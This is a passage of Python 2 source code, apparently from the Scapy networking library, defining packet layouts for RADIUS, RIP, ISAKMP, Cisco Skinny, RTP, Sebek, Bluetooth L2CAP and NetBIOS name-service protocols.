            p = p[:4]+chr((c>>8)&0xff)+chr(c&0xff)+p[6:]
        return p


class Radius(Packet):
    name = "Radius"
    fields_desc = [ ByteEnumField("code", 1, {1: "Access-Request",
                                              2: "Access-Accept",
                                              3: "Access-Reject",
                                              4: "Accounting-Request",
                                              5: "Accounting-Accept",
                                              6: "Accounting-Status",
                                              7: "Password-Request",
                                              8: "Password-Ack",
                                              9: "Password-Reject",
                                              10: "Accounting-Message",
                                              11: "Access-Challenge",
                                              12: "Status-Server",
                                              13: "Status-Client",
                                              21: "Resource-Free-Request",
                                              22: "Resource-Free-Response",
                                              23: "Resource-Query-Request",
                                              24: "Resource-Query-Response",
                                              25: "Alternate-Resource-Reclaim-Request",
                                              26: "NAS-Reboot-Request",
                                              27: "NAS-Reboot-Response",
                                              29: "Next-Passcode",
                                              30: "New-Pin",
                                              31: "Terminate-Session",
                                              32: "Password-Expired",
                                              33: "Event-Request",
                                              34: "Event-Response",
                                              40: "Disconnect-Request",
                                              41: "Disconnect-ACK",
                                              42: "Disconnect-NAK",
                                              43: "CoA-Request",
                                              44: "CoA-ACK",
                                              45: "CoA-NAK",
                                              50: "IP-Address-Allocate",
                                              51: "IP-Address-Release",
                                              253: "Experimental-use",
                                              254: "Reserved",
                                              255: "Reserved"} ),
                    ByteField("id", 0),
                    ShortField("len", None),
                    StrFixedLenField("authenticator","",16) ]
    def post_build(self, p, pay):
        p += pay
        l = self.len
        if l is None:
            l = len(p)
            p = p[:2]+struct.pack("!H",l)+p[4:]
        return p




class RIP(Packet):
    name = "RIP header"
    fields_desc = [
        ByteEnumField("command",1,{1:"req",2:"resp",3:"traceOn",4:"traceOff",5:"sun",
                                   6:"trigReq",7:"trigResp",8:"trigAck",9:"updateReq",
                                   10:"updateResp",11:"updateAck"}),
        ByteField("version",1),
        ShortField("null",0),
        ]

class RIPEntry(Packet):
    name = "RIP entry"
    fields_desc = [
        ShortEnumField("AF",2,{2:"IP"}),
        ShortField("RouteTag",0),
        IPField("addr","0.0.0.0"),
        IPField("mask","0.0.0.0"),
        IPField("nextHop","0.0.0.0"),
        IntEnumField("metric",1,{16:"Unreach"}),
        ]




ISAKMP_payload_type = ["None","SA","Proposal","Transform","KE","ID","CERT","CR","Hash",
                       "SIG","Nonce","Notification","Delete","VendorID"]

ISAKMP_exchange_type = ["None","base","identity prot.",
                        "auth only", "aggressive", "info"]


class ISAKMP_class(Packet):
    def guess_payload_class(self, payload):
        np = self.next_payload
        if np == 0:
            return Raw
        elif np < len(ISAKMP_payload_type):
            pt = ISAKMP_payload_type[np]
            return globals().get("ISAKMP_payload_%s" % pt, ISAKMP_payload)
        else:
            return ISAKMP_payload


class ISAKMP(ISAKMP_class): # rfc2408
    name = "ISAKMP"
    fields_desc = [
        StrFixedLenField("init_cookie","",8),
        StrFixedLenField("resp_cookie","",8),
        ByteEnumField("next_payload",0,ISAKMP_payload_type),
        XByteField("version",0x10),
        ByteEnumField("exch_type",0,ISAKMP_exchange_type),
        FlagsField("flags",0, 8, ["encryption","commit","auth_only","res3","res4","res5","res6","res7"]), # XXX use a Flag field
        IntField("id",0),
        IntField("length",None)
        ]

    def guess_payload_class(self, payload):
        if self.flags & 1:
            return Raw
        return ISAKMP_class.guess_payload_class(self, payload)

    def answers(self, other):
        if isinstance(other, ISAKMP):
            if other.init_cookie == self.init_cookie:
                return 1
        return 0
    def post_build(self, p, pay):
        p += pay
        if self.length is None:
            p = p[:24]+struct.pack("!I",len(p))+p[28:]
        return p




class ISAKMP_payload_Transform(ISAKMP_class):
    name = "IKE Transform"
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
#        ShortField("len",None),
        ShortField("length",None),
        ByteField("num",None),
        ByteEnumField("id",1,{1:"KEY_IKE"}),
        ShortField("res2",0),
        ISAKMPTransformSetField("transforms",None,length_from=lambda x:x.length-8)
#        XIntField("enc",0x80010005L),
#        XIntField("hash",0x80020002L),
#        XIntField("auth",0x80030001L),
#        XIntField("group",0x80040002L),
#        XIntField("life_type",0x800b0001L),
#        XIntField("durationh",0x000c0004L),
#        XIntField("durationl",0x00007080L),
        ]
    def post_build(self, p, pay):
        if self.length is None:
            l = len(p)
            p = p[:2]+chr((l>>8)&0xff)+chr(l&0xff)+p[4:]
        p += pay
        return p




class ISAKMP_payload_Proposal(ISAKMP_class):
    name = "IKE proposal"
#    ISAKMP_payload_type = 0
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"trans","H", adjust=lambda pkt,x:x+8),
        ByteField("proposal",1),
        ByteEnumField("proto",1,{1:"ISAKMP"}),
        FieldLenField("SPIsize",None,"SPI","B"),
        ByteField("trans_nb",None),
        StrLenField("SPI","",length_from=lambda x:x.SPIsize),
        PacketLenField("trans",Raw(),ISAKMP_payload_Transform,length_from=lambda x:x.length-8),
        ]


class ISAKMP_payload(ISAKMP_class):
    name = "ISAKMP payload"
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"load","H", adjust=lambda pkt,x:x+4),
        StrLenField("load","",length_from=lambda x:x.length-4),
        ]


class ISAKMP_payload_VendorID(ISAKMP_class):
    name = "ISAKMP Vendor ID"
    overload_fields = { ISAKMP: { "next_payload":13 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"vendorID","H", adjust=lambda pkt,x:x+4),
        StrLenField("vendorID","",length_from=lambda x:x.length-4),
        ]

class ISAKMP_payload_SA(ISAKMP_class):
    name = "ISAKMP SA"
    overload_fields = { ISAKMP: { "next_payload":1 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"prop","H", adjust=lambda pkt,x:x+12),
        IntEnumField("DOI",1,{1:"IPSEC"}),
        IntEnumField("situation",1,{1:"identity"}),
        PacketLenField("prop",Raw(),ISAKMP_payload_Proposal,length_from=lambda x:x.length-12),
        ]

class ISAKMP_payload_Nonce(ISAKMP_class):
    name = "ISAKMP Nonce"
    overload_fields = { ISAKMP: { "next_payload":10 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"load","H", adjust=lambda pkt,x:x+4),
        StrLenField("load","",length_from=lambda x:x.length-4),
        ]

class ISAKMP_payload_KE(ISAKMP_class):
    name = "ISAKMP Key Exchange"
    overload_fields = { ISAKMP: { "next_payload":4 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"load","H", adjust=lambda pkt,x:x+4),
        StrLenField("load","",length_from=lambda x:x.length-4),
        ]

class ISAKMP_payload_ID(ISAKMP_class):
    name = "ISAKMP Identification"
    overload_fields = { ISAKMP: { "next_payload":5 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"load","H",adjust=lambda pkt,x:x+8),
        ByteEnumField("IDtype",1,{1:"IPv4_addr", 11:"Key"}),
        ByteEnumField("ProtoID",0,{0:"Unused"}),
        ShortEnumField("Port",0,{0:"Unused"}),
#        IPField("IdentData","127.0.0.1"),
        StrLenField("load","",length_from=lambda x:x.length-8),
        ]



class ISAKMP_payload_Hash(ISAKMP_class):
    name = "ISAKMP Hash"
    overload_fields = { ISAKMP: { "next_payload":8 }}
    fields_desc = [
        ByteEnumField("next_payload",None,ISAKMP_payload_type),
        ByteField("res",0),
        FieldLenField("length",None,"load","H",adjust=lambda pkt,x:x+4),
        StrLenField("load","",length_from=lambda x:x.length-4),
        ]



ISAKMP_payload_type_overload = {}
for i in range(len(ISAKMP_payload_type)):
    name = "ISAKMP_payload_%s" % ISAKMP_payload_type[i]
    if name in globals():
        ISAKMP_payload_type_overload[globals()[name]] = {"next_payload":i}

del(i)
del(name)
ISAKMP_class.overload_fields = ISAKMP_payload_type_overload.copy()




# Cisco Skinny protocol

# shamelessly ripped from Ethereal dissector
skinny_messages = {
# Station -> Callmanager
  0x0000: "KeepAliveMessage",
  0x0001: "RegisterMessage",
  0x0002: "IpPortMessage",
  0x0003: "KeypadButtonMessage",
  0x0004: "EnblocCallMessage",
  0x0005: "StimulusMessage",
  0x0006: "OffHookMessage",
  0x0007: "OnHookMessage",
  0x0008: "HookFlashMessage",
  0x0009: "ForwardStatReqMessage",
  0x000A: "SpeedDialStatReqMessage",
  0x000B: "LineStatReqMessage",
  0x000C: "ConfigStatReqMessage",
  0x000D: "TimeDateReqMessage",
  0x000E: "ButtonTemplateReqMessage",
  0x000F: "VersionReqMessage",
  0x0010: "CapabilitiesResMessage",
  0x0011: "MediaPortListMessage",
  0x0012: "ServerReqMessage",
  0x0020: "AlarmMessage",
  0x0021: "MulticastMediaReceptionAck",
  0x0022: "OpenReceiveChannelAck",
  0x0023: "ConnectionStatisticsRes",
  0x0024: "OffHookWithCgpnMessage",
  0x0025: "SoftKeySetReqMessage",
  0x0026: "SoftKeyEventMessage",
  0x0027: "UnregisterMessage",
  0x0028: "SoftKeyTemplateReqMessage",
  0x0029: "RegisterTokenReq",
  0x002A: "MediaTransmissionFailure",
  0x002B: "HeadsetStatusMessage",
  0x002C: "MediaResourceNotification",
  0x002D: "RegisterAvailableLinesMessage",
  0x002E: "DeviceToUserDataMessage",
  0x002F: "DeviceToUserDataResponseMessage",
  0x0030: "UpdateCapabilitiesMessage",
  0x0031: "OpenMultiMediaReceiveChannelAckMessage",
  0x0032: "ClearConferenceMessage",
  0x0033: "ServiceURLStatReqMessage",
  0x0034: "FeatureStatReqMessage",
  0x0035: "CreateConferenceResMessage",
  0x0036: "DeleteConferenceResMessage",
  0x0037: "ModifyConferenceResMessage",
  0x0038: "AddParticipantResMessage",
  0x0039: "AuditConferenceResMessage",
  0x0040: "AuditParticipantResMessage",
  0x0041: "DeviceToUserDataVersion1Message",
# Callmanager -> Station */
  0x0081: "RegisterAckMessage",
  0x0082: "StartToneMessage",
  0x0083: "StopToneMessage",
  0x0085: "SetRingerMessage",
  0x0086: "SetLampMessage",
  0x0087: "SetHkFDetectMessage",
  0x0088: "SetSpeakerModeMessage",
  0x0089: "SetMicroModeMessage",
  0x008A: "StartMediaTransmission",
  0x008B: "StopMediaTransmission",
  0x008C: "StartMediaReception",
  0x008D: "StopMediaReception",
  0x008F: "CallInfoMessage",
  0x0090: "ForwardStatMessage",
  0x0091: "SpeedDialStatMessage",
  0x0092: "LineStatMessage",
  0x0093: "ConfigStatMessage",
  0x0094: "DefineTimeDate",
  0x0095: "StartSessionTransmission",
  0x0096: "StopSessionTransmission",
  0x0097: "ButtonTemplateMessage",
  0x0098: "VersionMessage",
  0x0099: "DisplayTextMessage",
  0x009A: "ClearDisplay",
  0x009B: "CapabilitiesReqMessage",
  0x009C: "EnunciatorCommandMessage",
  0x009D: "RegisterRejectMessage",
  0x009E: "ServerResMessage",
  0x009F: "Reset",
  0x0100: "KeepAliveAckMessage",
  0x0101: "StartMulticastMediaReception",
  0x0102: "StartMulticastMediaTransmission",
  0x0103: "StopMulticastMediaReception",
  0x0104: "StopMulticastMediaTransmission",
  0x0105: "OpenReceiveChannel",
  0x0106: "CloseReceiveChannel",
  0x0107: "ConnectionStatisticsReq",
  0x0108: "SoftKeyTemplateResMessage",
  0x0109: "SoftKeySetResMessage",
  0x0110: "SelectSoftKeysMessage",
  0x0111: "CallStateMessage",
  0x0112: "DisplayPromptStatusMessage",
  0x0113: "ClearPromptStatusMessage",
  0x0114: "DisplayNotifyMessage",
  0x0115: "ClearNotifyMessage",
  0x0116: "ActivateCallPlaneMessage",
  0x0117: "DeactivateCallPlaneMessage",
  0x0118: "UnregisterAckMessage",
  0x0119: "BackSpaceReqMessage",
  0x011A: "RegisterTokenAck",
  0x011B: "RegisterTokenReject",
  0x0042: "DeviceToUserDataResponseVersion1Message",
  0x011C: "StartMediaFailureDetection",
  0x011D: "DialedNumberMessage",
  0x011E: "UserToDeviceDataMessage",
  0x011F: "FeatureStatMessage",
  0x0120: "DisplayPriNotifyMessage",
  0x0121: "ClearPriNotifyMessage",
  0x0122: "StartAnnouncementMessage",
  0x0123: "StopAnnouncementMessage",
  0x0124: "AnnouncementFinishMessage",
  0x0127: "NotifyDtmfToneMessage",
  0x0128: "SendDtmfToneMessage",
  0x0129: "SubscribeDtmfPayloadReqMessage",
  0x012A: "SubscribeDtmfPayloadResMessage",
  0x012B: "SubscribeDtmfPayloadErrMessage",
  0x012C: "UnSubscribeDtmfPayloadReqMessage",
  0x012D: "UnSubscribeDtmfPayloadResMessage",
  0x012E: "UnSubscribeDtmfPayloadErrMessage",
  0x012F: "ServiceURLStatMessage",
  0x0130: "CallSelectStatMessage",
  0x0131: "OpenMultiMediaChannelMessage",
  0x0132: "StartMultiMediaTransmission",
  0x0133: "StopMultiMediaTransmission",
  0x0134: "MiscellaneousCommandMessage",
  0x0135: "FlowControlCommandMessage",
  0x0136: "CloseMultiMediaReceiveChannel",
  0x0137: "CreateConferenceReqMessage",
  0x0138: "DeleteConferenceReqMessage",
  0x0139: "ModifyConferenceReqMessage",
  0x013A: "AddParticipantReqMessage",
  0x013B: "DropParticipantReqMessage",
  0x013C: "AuditConferenceReqMessage",
  0x013D: "AuditParticipantReqMessage",
  0x013F: "UserToDeviceDataVersion1Message",
  }



class Skinny(Packet):
    name="Skinny"
    fields_desc = [ LEIntField("len",0),
                    LEIntField("res",0),
                    LEIntEnumField("msg",0,skinny_messages) ]

_rtp_payload_types = {
    # http://www.iana.org/assignments/rtp-parameters
    0:  'G.711 PCMU',    3:  'GSM',
    4:  'G723',    5:  'DVI4',
    6:  'DVI4',    7:  'LPC',
    8:  'PCMA',    9:  'G722',
    10: 'L16',     11: 'L16',
    12: 'QCELP',   13: 'CN',
    14: 'MPA',     15: 'G728',
    16: 'DVI4',    17: 'DVI4',
    18: 'G729',    25: 'CelB',
    26: 'JPEG',    28: 'nv',
    31: 'H261',    32: 'MPV',
    33: 'MP2T',    34: 'H263' }

class RTP(Packet):
    name="RTP"
    fields_desc = [ BitField('version', 2, 2),
                    BitField('padding', 0, 1),
                    BitField('extension', 0, 1),
                    BitFieldLenField('numsync', None, 4, count_of='sync'),
                    BitField('marker', 0, 1),
                    BitEnumField('payload', 0, 7, _rtp_payload_types),
                    ShortField('sequence', 0),
                    IntField('timestamp', 0),
                    IntField('sourcesync', 0),
                    FieldListField('sync', [], IntField("id",0), count_from=lambda pkt:pkt.numsync) ]

### SEBEK


class SebekHead(Packet):
    name = "Sebek header"
    fields_desc = [ XIntField("magic", 0xd0d0d0),
                    ShortField("version", 1),
                    ShortEnumField("type", 0, {"read":0, "write":1,
                                             "socket":2, "open":3}),
                    IntField("counter", 0),
                    IntField("time_sec", 0),
                    IntField("time_usec", 0) ]
    def mysummary(self):
        return self.sprintf("Sebek Header v%SebekHead.version% %SebekHead.type%")

# we need this because Sebek headers differ between v1 and v3, and
# between v3 type socket and v3 others

class SebekV1(Packet):
    name = "Sebek v1"
    fields_desc = [ IntField("pid", 0),
                    IntField("uid", 0),
                    IntField("fd", 0),
                    StrFixedLenField("command", "", 12),
                    FieldLenField("data_length", None, "data",fmt="I"),
                    StrLenField("data", "", length_from=lambda x:x.data_length) ]
    def mysummary(self):
        if isinstance(self.underlayer, SebekHead):
            return self.underlayer.sprintf("Sebek v1 %SebekHead.type% (%SebekV1.command%)")
        else:
            return self.sprintf("Sebek v1 (%SebekV1.command%)")

class SebekV3(Packet):
    name = "Sebek v3"
    fields_desc = [ IntField("parent_pid", 0),
                    IntField("pid", 0),
                    IntField("uid", 0),
                    IntField("fd", 0),
                    IntField("inode", 0),
                    StrFixedLenField("command", "", 12),
                    FieldLenField("data_length", None, "data",fmt="I"),
                    StrLenField("data", "", length_from=lambda x:x.data_length) ]
    def mysummary(self):
        if isinstance(self.underlayer, SebekHead):
            return self.underlayer.sprintf("Sebek v%SebekHead.version% %SebekHead.type% (%SebekV3.command%)")
        else:
            return self.sprintf("Sebek v3 (%SebekV3.command%)")

class SebekV2(SebekV3):
    def mysummary(self):
        if isinstance(self.underlayer, SebekHead):
            return self.underlayer.sprintf("Sebek v%SebekHead.version% %SebekHead.type% (%SebekV2.command%)")
        else:
            return self.sprintf("Sebek v2 (%SebekV2.command%)")

class SebekV3Sock(Packet):
    name = "Sebek v2 socket"
    fields_desc = [ IntField("parent_pid", 0),
                    IntField("pid", 0),
                    IntField("uid", 0),
                    IntField("fd", 0),
                    IntField("inode", 0),
                    StrFixedLenField("command", "", 12),
                    IntField("data_length", 15),
                    IPField("dip", "127.0.0.1"),
                    ShortField("dport", 0),
                    IPField("sip", "127.0.0.1"),
                    ShortField("sport", 0),
                    ShortEnumField("call", 0, { "bind":2,
                                                "connect":3, "listen":4,
                                               "accept":5, "sendmsg":16,
                                               "recvmsg":17, "sendto":11,
                                               "recvfrom":12}),
                    ByteEnumField("proto", 0, IP_PROTOS) ]
    def mysummary(self):
        if isinstance(self.underlayer, SebekHead):
            return self.underlayer.sprintf("Sebek v%SebekHead.version% %SebekHead.type% (%SebekV3Sock.command%)")
        else:
            return self.sprintf("Sebek v3 socket (%SebekV3Sock.command%)")

class SebekV2Sock(SebekV3Sock):
    def mysummary(self):
        if isinstance(self.underlayer, SebekHead):
            return self.underlayer.sprintf("Sebek v%SebekHead.version% %SebekHead.type% (%SebekV2Sock.command%)")
        else:
            return self.sprintf("Sebek v2 socket (%SebekV2Sock.command%)")

class MGCP(Packet):
    name = "MGCP"
    longname = "Media Gateway Control Protocol"
    fields_desc = [ StrStopField("verb","AUEP"," ", -1),
                    StrFixedLenField("sep1"," ",1),
                    StrStopField("transaction_id","1234567"," ", -1),
                    StrFixedLenField("sep2"," ",1),
                    StrStopField("endpoint","dummy@dummy.net"," ", -1),
                    StrFixedLenField("sep3"," ",1),
                    StrStopField("version","MGCP 1.0 NCS 1.0","\x0a", -1),
                    StrFixedLenField("sep4","\x0a",1),
                    ]


#class MGCP(Packet):
#    name = "MGCP"
#    longname = "Media Gateway Control Protocol"
#    fields_desc = [ ByteEnumField("type",0, ["request","response","others"]),
#                    ByteField("code0",0),
#                    ByteField("code1",0),
#                    ByteField("code2",0),
#                    ByteField("code3",0),
#                    ByteField("code4",0),
#                    IntField("trasid",0),
#                    IntField("req_time",0),
#                    ByteField("is_duplicate",0),
#                    ByteField("req_available",0) ]
#
class GPRS(Packet):
    name = "GPRSdummy"
    fields_desc = [
        StrStopField("dummy","","\x65\x00\x00",1)
        ]


class HCI_Hdr(Packet):
    name = "HCI header"
    fields_desc = [ ByteEnumField("type",2,{1:"command",2:"ACLdata",3:"SCOdata",4:"event",5:"vendor"}),]

    def mysummary(self):
        return self.sprintf("HCI %type%")

class HCI_ACL_Hdr(Packet):
    name = "HCI ACL header"
    fields_desc = [ ByteField("handle",0), # Actually, handle is 12 bits and flags is 4.
                    ByteField("flags",0),  # I wait to write a LEBitField
                    LEShortField("len",None), ]
    def post_build(self, p, pay):
        p += pay
        if self.len is None:
            l = len(p)-4
            p = p[:2]+chr(l&0xff)+chr((l>>8)&0xff)+p[4:]
        return p


class L2CAP_Hdr(Packet):
    name = "L2CAP header"
    fields_desc = [ LEShortField("len",None),
                    LEShortEnumField("cid",0,{1:"control"}),]

    def post_build(self, p, pay):
        p += pay
        if self.len is None:
            l = len(p)-4
            p = p[:2]+chr(l&0xff)+chr((l>>8)&0xff)+p[4:]
        return p



class L2CAP_CmdHdr(Packet):
    name = "L2CAP command header"
    fields_desc = [
        ByteEnumField("code",8,{1:"rej",2:"conn_req",3:"conn_resp",
                                4:"conf_req",5:"conf_resp",6:"disconn_req",
                                7:"disconn_resp",8:"echo_req",9:"echo_resp",
                                10:"info_req",11:"info_resp"}),
        ByteField("id",0),
        LEShortField("len",None) ]
    def post_build(self, p, pay):
        p += pay
        if self.len is None:
            l = len(p)-4
            p = p[:2]+chr(l&0xff)+chr((l>>8)&0xff)+p[4:]
        return p
    def answers(self, other):
        if other.id == self.id:
            if self.code == 1:
                return 1
            if other.code in [2,4,6,8,10] and self.code == other.code+1:
                if other.code == 8:
                    return 1
                return self.payload.answers(other.payload)
        return 0

class L2CAP_ConnReq(Packet):
    name = "L2CAP Conn Req"
    fields_desc = [ LEShortEnumField("psm",0,{1:"SDP",3:"RFCOMM",5:"telephony control"}),
                    LEShortField("scid",0),
                    ]

class L2CAP_ConnResp(Packet):
    name = "L2CAP Conn Resp"
    fields_desc = [ LEShortField("dcid",0),
                    LEShortField("scid",0),
                    LEShortEnumField("result",0,["no_info","authen_pend","author_pend"]),
                    LEShortEnumField("status",0,["success","pend","bad_psm",
                                               "cr_sec_block","cr_no_mem"]),
                    ]
    def answers(self, other):
        return self.scid == other.scid

class L2CAP_CmdRej(Packet):
    name = "L2CAP Command Rej"
    fields_desc = [ LEShortField("reason",0),
                    ]


class L2CAP_ConfReq(Packet):
    name = "L2CAP Conf Req"
    fields_desc = [ LEShortField("dcid",0),
                    LEShortField("flags",0),
                    ]

class L2CAP_ConfResp(Packet):
    name = "L2CAP Conf Resp"
    fields_desc = [ LEShortField("scid",0),
                    LEShortField("flags",0),
                    LEShortEnumField("result",0,["success","unaccept","reject","unknown"]),
                    ]
    def answers(self, other):
        return self.scid == other.scid


class L2CAP_DisconnReq(Packet):
    name = "L2CAP Disconn Req"
    fields_desc = [ LEShortField("dcid",0),
                    LEShortField("scid",0), ]

class L2CAP_DisconnResp(Packet):
    name = "L2CAP Disconn Resp"
    fields_desc = [ LEShortField("dcid",0),
                    LEShortField("scid",0), ]
    def answers(self, other):
        return self.scid == other.scid



class L2CAP_InfoReq(Packet):
    name = "L2CAP Info Req"
    fields_desc = [ LEShortEnumField("type",0,{1:"CL_MTU",2:"FEAT_MASK"}),
                    StrField("data","")
                    ]


class L2CAP_InfoResp(Packet):
    name = "L2CAP Info Resp"
    fields_desc = [ LEShortField("type",0),
                    LEShortEnumField("result",0,["success","not_supp"]),
                    StrField("data",""), ]
    def answers(self, other):
        return self.type == other.type




class NetBIOS_DS(Packet):
    name = "NetBIOS datagram service"
    fields_desc = [
        ByteEnumField("type",17, {17:"direct_group"}),
        ByteField("flags",0),
        XShortField("id",0),
        IPField("src","127.0.0.1"),
        ShortField("sport",138),
        ShortField("len",None),
        ShortField("ofs",0),
        NetBIOSNameField("srcname",""),
        NetBIOSNameField("dstname",""),
        ]
    def post_build(self, p, pay):
        p += pay
        if self.len is None:
            l = len(p)-14
            p = p[:10]+struct.pack("!H", l)+p[12:]
        return p

#        ShortField("length",0),
#        ShortField("Delimitor",0),
#        ByteField("command",0),
#        ByteField("data1",0),
#        ShortField("data2",0),
#        ShortField("XMIt",0),
#        ShortField("RSPCor",0),
#        StrFixedLenField("dest","",16),
#        StrFixedLenField("source","",16),
#
#        ]
#

# IR

class IrLAPHead(Packet):
    name = "IrDA Link Access Protocol Header"
    fields_desc = [ XBitField("Address", 0x7f, 7),
                    BitEnumField("Type", 1, 1, {"Response":0,
                                                "Command":1})]

class IrLAPCommand(Packet):
    name = "IrDA Link Access Protocol Command"
    fields_desc = [ XByteField("Control", 0),
                    XByteField("Format identifier", 0),
                    XIntField("Source address", 0),
                    XIntField("Destination address", 0xffffffffL),
                    XByteField("Discovery flags", 0x1),
                    ByteEnumField("Slot number", 255, {"final":255}),
                    XByteField("Version", 0)]


class IrLMP(Packet):
    name = "IrDA Link Management Protocol"
    fields_desc = [ XShortField("Service hints", 0),
                    XByteField("Character set", 0),
                    StrField("Device name", "") ]


#NetBIOS


# Name Query Request
# Node Status Request
class NBNSQueryRequest(Packet):
    name="NBNS query request"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0x0110),
                   ShortField("QDCOUNT",1),
                   ShortField("ANCOUNT",0),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",0),
                   NetBIOSNameField("QUESTION_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("QUESTION_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("QUESTION_CLASS",1,{1:"INTERNET"})]

# Name Registration Request
# Name Refresh Request
# Name Release Request or Demand
class NBNSRequest(Packet):
    name="NBNS request"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0x2910),
                   ShortField("QDCOUNT",1),
                   ShortField("ANCOUNT",0),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",1),
                   NetBIOSNameField("QUESTION_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("QUESTION_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("QUESTION_CLASS",1,{1:"INTERNET"}),
                   ShortEnumField("RR_NAME",0xC00C,{0xC00C:"Label String Pointer to QUESTION_NAME"}),
                   ShortEnumField("RR_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("RR_CLASS",1,{1:"INTERNET"}),
                   IntField("TTL", 0),
                   ShortField("RDLENGTH", 6),
                   BitEnumField("G",0,1,{0:"Unique name",1:"Group name"}),
                   BitEnumField("OWNER NODE TYPE",00,2,{00:"B node",01:"P node",02:"M node",03:"H node"}),
                   BitEnumField("UNUSED",0,13,{0:"Unused"}),
                   IPField("NB_ADDRESS", "127.0.0.1")]

# Name Query Response
# Name Registration Response
class NBNSQueryResponse(Packet):
    name="NBNS query response"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0x8500),
                   ShortField("QDCOUNT",0),
                   ShortField("ANCOUNT",1),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",0),
                   NetBIOSNameField("RR_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("QUESTION_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("QUESTION_CLASS",1,{1:"INTERNET"}),
                   IntField("TTL", 0x493e0),
                   ShortField("RDLENGTH", 6),
                   ShortField("NB_FLAGS", 0),
                   IPField("NB_ADDRESS", "127.0.0.1")]

# Name Query Response (negative)
# Name Release Response
class NBNSQueryResponseNegative(Packet):
    name="NBNS query response (negative)"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0x8506),
                   ShortField("QDCOUNT",0),
                   ShortField("ANCOUNT",1),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",0),
                   NetBIOSNameField("RR_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("RR_TYPE",0x20, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("RR_CLASS",1,{1:"INTERNET"}),
                   IntField("TTL",0),
                   ShortField("RDLENGTH",6),
                   BitEnumField("G",0,1,{0:"Unique name",1:"Group name"}),
                   BitEnumField("OWNER NODE TYPE",00,2,{00:"B node",01:"P node",02:"M node",03:"H node"}),
                   BitEnumField("UNUSED",0,13,{0:"Unused"}),
                   IPField("NB_ADDRESS", "127.0.0.1")]

# Node Status Response
class NBNSNodeStatusResponse(Packet):
    name="NBNS Node Status Response"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0x8500),
                   ShortField("QDCOUNT",0),
                   ShortField("ANCOUNT",1),
                   ShortField("NSCOUNT",0),
                   ShortField("ARCOUNT",0),
                   NetBIOSNameField("RR_NAME","windows"),
                   ShortEnumField("SUFFIX",0x4141,{0x4141:"workstation",0x4141+0x03:"messenger service",0x4141+0x200:"file server service",0x4141+0x10b:"domain master browser",0x4141+0x10c:"domain controller", 0x4141+0x10e:"browser election service"}),
                   ByteField("NULL",0),
                   ShortEnumField("RR_TYPE",0x21, {0x20:"NB",0x21:"NBSTAT"}),
                   ShortEnumField("RR_CLASS",1,{1:"INTERNET"}),
                   IntField("TTL",0),
                   ShortField("RDLENGTH",83),
                   ByteField("NUM_NAMES",1)]

# Service for Node Status Response
class NBNSNodeStatusResponseService(Packet):
    name="NBNS Node Status Response Service"
    fields_desc = [StrFixedLenField("NETBIOS_NAME","WINDOWS         ",15),
                   ByteEnumField("SUFFIX",0,{0:"workstation",0x03:"messenger service",0x20:"file server service",0x1b:"domain master browser",0x1c:"domain controller", 0x1e:"browser election service"}),
                   ByteField("NAME_FLAGS",0x4),
                   ByteEnumField("UNUSED",0,{0:"unused"})]

# End of Node Status Response packet
class NBNSNodeStatusResponseEnd(Packet):
    name="NBNS Node Status Response"
    fields_desc = [SourceMACField("MAC_ADDRESS"),
                   BitField("STATISTICS",0,57*8)]

# Wait for Acknowledgement Response
class NBNSWackResponse(Packet):
    name="NBNS Wait for Acknowledgement Response"
    fields_desc = [ShortField("NAME_TRN_ID",0),
                   ShortField("FLAGS", 0xBC07),
                   ShortField("QDCOUNT",0),
